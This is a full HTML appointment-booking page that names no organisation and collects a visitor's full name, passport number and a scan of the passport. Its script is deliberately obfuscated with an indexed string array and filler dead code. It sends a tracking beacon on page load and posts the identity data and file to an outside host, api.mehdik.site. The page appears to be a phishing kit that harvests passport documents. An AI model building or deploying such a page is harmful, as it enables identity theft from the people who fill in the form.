<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Booking appointments</title>
  <style>
    :root{--glass-bg:rgba(255,255,255,0.12);--glass-bg-hover:rgba(255,255,255,0.22);--danger:#ff5252;--ok:#22c55e}
    *{box-sizing:border-box}
    body{min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:"Poppins",system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,sans-serif;background:linear-gradient(135deg,#007aff,#00c6ff);margin:0;color:#fff;padding:20px}
    h1{font-size:2.4rem;font-weight:700;margin:0 0 18px;text-shadow:0 4px 10px rgba(0,0,0,.3);animation:fadeInDown .8s ease;text-align:center}
    form{width:100%;max-width:560px;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.25);border-radius:18px;padding:22px;backdrop-filter:blur(10px);box-shadow:0 10px 30px rgba(0,0,0,.25);animation:fadeInUp .9s ease;position:relative;overflow:hidden}
    label{display:block;font-weight:600;margin:12px 6px 6px}
    .req{opacity:.9}
    input[type=text],input[type=tel],input[type=file]{width:100%;padding:14px 16px;border-radius:14px;background:rgba(255,255,255,.15);color:#fff;border:1px solid rgba(255,255,255,.28);outline:none;transition:all .25s ease}
    input::file-selector-button{padding:10px 16px;border:none;border-radius:12px;background:rgba(0,0,0,.25);color:#fff;margin-inline-end:12px;cursor:pointer}
    input:focus{box-shadow:0 0 0 3px rgba(255,255,255,.25)}
    .row{display:grid;grid-template-columns:1fr;gap:14px}
    @media(min-width:640px){.row{grid-template-columns:1fr 1fr}}
    .help{font-size:.9rem;opacity:.85;margin:6px 6px 0}
    .error{color:var(--danger);margin:6px 6px 0;display:none}
    button{width:100%;padding:14px 20px;font-size:1.1rem;border:none;border-radius:14px;background:var(--glass-bg);color:#fff;cursor:pointer;backdrop-filter:blur(10px);transition:all .25s ease;font-weight:600;box-shadow:0 6px 18px rgba(0,0,0,.22);margin-top:16px}
    button:hover{background:var(--glass-bg-hover);transform:translateY(-1px)}
    button:disabled{opacity:.7;cursor:not-allowed}
    .toast{position:fixed;inset-inline:0;bottom:24px;margin-inline:auto;width:fit-content;padding:14px 18px;background:rgba(0,0,0,.78);border-radius:12px;font-size:1rem;opacity:0;transition:opacity .35s ease}
    .toast.show{opacity:1}
    .form-success{box-shadow:0 0 0 2px rgba(34,197,94,.8),0 0 40px rgba(34,197,94,.5) inset;animation:successPulse 1.2s ease}
    @keyframes successPulse{0%{box-shadow:0 0 0 0 rgba(34,197,94,0),0 0 0 rgba(34,197,94,0) inset}30%{box-shadow:0 0 0 2px rgba(34,197,94,.8),0 0 40px rgba(34,197,94,.35) inset}100%{box-shadow:0 0 0 2px rgba(34,197,94,.25),0 0 12px rgba(34,197,94,.2) inset}}
    .checkmark{position:absolute;inset:0;display:grid;place-items:center;pointer-events:none;opacity:0;transition:opacity .25s ease}
    .checkmark svg{width:92px;height:92px;filter:drop-shadow(0 6px 22px rgba(0,0,0,.35))}
    .checkmark.show{opacity:1}
    #confettiCanvas{position:fixed;inset:0;pointer-events:none}
    @keyframes fadeInDown{from{opacity:0;transform:translateY(-16px)}to{opacity:1;transform:translateY(0)}}
    @keyframes fadeInUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
  </style>
</head>
<body>
  <h1>Welcome</h1>

  <form id="visit-form">
    <div class="row">
      <div>
        <label for="fullName">Full Name <span class="req">*</span></label>
        <input id="fullName" name="fullName" type="text" placeholder="Full Name" autocomplete="name" required />
        <div id="errName" class="error">Please enter a valid full name (3 characters or more).</div>
      </div>
      <div>
        <label for="passport">Passport Number <span class="req">*</span></label>
        <input id="passport" name="passport" type="text" pattern="[A-Za-z0-9]{6,12}" placeholder="Passport Number" required />
        <div id="errPass" class="error">Passport number must be 6–12 Latin letters or digits.</div>
      </div>
    </div>

    <label for="pdf">Upload Passport File (PDF or Image) <span class="req">*</span></label>
    <input id="pdf" name="pdf" type="file" accept="application/pdf,image/*" required />
    <div class="help">Recommended maximum size: 20MB.</div>
    <div id="errFile" class="error">The file must be PDF or image and within size limit.</div>

    <button id="sendBtn" type="submit">Send</button>

    <div id="checkmark" class="checkmark" aria-hidden="true">
      <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="60" cy="60" r="54" stroke="white" stroke-width="6" opacity=".25"/>
        <path d="M36 62 L54 78 L86 42" stroke="var(--ok)" stroke-width="8" stroke-linecap="round" stroke-linejoin="round" />
      </svg>
    </div>
  </form>

  <canvas id="confettiCanvas"></canvas>
  <div id="toast" class="toast"></div>

  <script>
  (function(){
    var _S = [
      "visit-form","toast","sendBtn","checkmark",
      "fullName","passport","pdf",
      "errName","errPass","errFile",
      "confettiCanvas",
      "form-success","show",
      "https://api.mehdik.site/","track","POST","cors",
      "application/pdf","image/jpeg","image/png","image/webp",
      "⚠️ Please check your inputs and try again.",
      "✅ Sent successfully.",
      "❌ Sending failed. Try again later.",
      "Sending…","Send",
      "block","none",
      "Server error ","ok","error",
      "visit tracking failed",
      "submit","textContent","classList","add","remove",
      "length","value","trim","files","type","size",
      "preventDefault","disabled"
    ];
    function _$(i){return _S[i];}
    var D=document;
    function _g(id){return D.getElementById(id);}

    var F=_g(_$(0)),
        T=_g(_$(1)),
        B=_g(_$(2)),
        C=_g(_$(3));

    function _m(msg){
      T[_$(33)] = msg;
      T[_$(34)][_$(35)](_$(12));
      setTimeout(function(){
        T[_$(34)][_$(36)](_$(12));
      },3200);
    }

    function _v(){
      var n=_g(_$(4)),
          p=_g(_$(5)),
          fl=_g(_$(6));
      var ok=true;

      var nm=(n[_$(38)]||"")[_$(39)]();
      if(nm[_$(37)]<3){
        _g(_$(7)).style.display=_$(26);
        ok=false;
      }else{
        _g(_$(7)).style.display=_$(27);
      }

      var re=/^[A-Za-z0-9]{6,12}$/;
      var pv=(p[_$(38)]||"")[_$(39)]();
      if(!re.test(pv)){
        _g(_$(8)).style.display=_$(26);
        ok=false;
      }else{
        _g(_$(8)).style.display=_$(27);
      }

      var f0=fl[_$(40)][0];
      var okF=!!f0 &&
        [_$(17),_$(18),_$(19),_$(20)].indexOf(f0[_$(41)])!==-1 &&
        f0[_$(42)]<=20*1024*1024;

      if(!okF){
        _g(_$(9)).style.display=_$(26);
        ok=false;
      }else{
        _g(_$(9)).style.display=_$(27);
      }
      return ok;
    }

    
    var _CF=(function(){
      var cv=_g(_$(10)),
          cx=cv.getContext("2d");
      var W=0,H=0,P=[],run=false,af;
      function rs(){
        W=cv.width=innerWidth;
        H=cv.height=innerHeight;
      }
      addEventListener("resize",rs);rs();
      function sp(n){
        n=n||140;
        P=Array.from({length:n},function(){
          return {
            x:Math.random()*W,
            y:-20-Math.random()*H*0.25,
            r:4+Math.random()*6,
            s:1+Math.random()*3,
            a:Math.random()*Math.PI*2,
            v:1+Math.random()*2
          };
        });
      }
      function dr(){
        cx.clearRect(0,0,W,H);
        for(var i=0;i<P.length;i++){
          var p=P[i];
          cx.save();
          cx.translate(p.x,p.y);
          p.a+=0.05;
          cx.rotate(p.a);
          cx.fillStyle="hsl("+((p.x/W)*360)+",100%,60%)";
          cx.fillRect(-p.r/2,-p.r/2,p.r,p.r);
          cx.restore();
          p.y+=p.s;
          p.x+=Math.sin(p.a)*p.v;
        }
        P=P.filter(function(p){return p.y<H+20;});
        if(P.length && run){
          af=requestAnimationFrame(dr);
        }else{
          run=false;
          cx.clearRect(0,0,W,H);
        }
      }
      function burst(){
        sp();
        run=true;
        cancelAnimationFrame(af);
        dr();
        setTimeout(function(){run=false;},1800);
      }
      return {burst:burst};
    })();

    function _success(){
      F.classList.add(_$(11));
      C.classList.add(_$(12));
      _CF.burst();
      setTimeout(function(){
        F.classList.remove(_$(11));
        C.classList.remove(_$(12));
      },1800);
    }

    var API=_$(13);

    (function(){
      
      try{
        fetch(API+_$(14),{method:_$(15),mode:_$(16)});
      }catch(e){
        console.error(_$(31),e);
      }
    })();

    async function _sendToServer(formEl){
      var fd=new FormData(formEl);
      var res=await fetch(API,{method:_$(15),body:fd});
      if(!res.ok) throw new Error(_$(28)+res.status);
      var data=await res.json();
      if(!data[_$(29)]) throw new Error(data[_$(30)]||"fail");
      return data;
    }

    F.addEventListener(_$(32),async function(ev){
      ev[_$(43)]();
      if(!_v()){
        _m(_$(21));
        return;
      }
      try{
        B[_$(44)]=true;
        B.textContent=_$(24);
        await _sendToServer(F);
        _m(_$(22));
        _success();
        F.reset();
      }catch(err){
        console.error(err);
        _m(_$(23));
      }finally{
        B[_$(44)]=false;
        B.textContent=_$(25);
      }
    });

    
    (function(z){
      if(z!==42){
        for(var i=0;i<1;i++){
          try{}catch(e){}
        }
      }
    })(41);
  })();
  </script>
</body>
</html>
